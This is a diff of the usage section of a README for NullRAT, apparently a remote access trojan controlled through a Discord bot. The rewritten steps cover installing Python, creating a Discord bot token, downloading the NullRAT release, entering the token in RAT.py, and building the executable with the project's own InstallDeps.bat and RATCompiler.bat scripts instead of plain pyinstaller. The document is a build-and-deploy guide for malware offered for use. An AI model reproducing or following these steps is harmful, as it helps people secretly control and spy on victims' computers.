@@ -33,17 +33,23 @@
 ```
 
 ## How to use:
+<h4>Preparation:</h4>
+
+- Python 3.6+ should be installed on the PC 
+- Tick "Add to PATH" while installing
+- Add PIP folder to path as well (`%APPDATA%\Python\{insert python folder}\Scripts`)
+
 <h4>IMPORTANT:</h4>
-Python 3.6+ should be installed on the PC and added to path (pip folder should be added too)
+Don't compile normally using pyinstaller, use the compiler provided
 
-Also don't compile normally using pyinstaller, use the compiler provided
+<h4>Steps:</h4>
 
-- [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
-- Git clone / Download repo as zip / Dowload the release
-- Fill up the empty variables & bot token in RAT.py
+- [Create a Discord BOT and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
+- Dowload the latest release of NullRAT
+- Fill up all the required information (BOT Token etc) in RAT.py
 - Finally, execute the following: 
 ```cmd
-Install Dependencies.bat
+InstallDeps.bat
 RATCompiler.bat
 ```
 
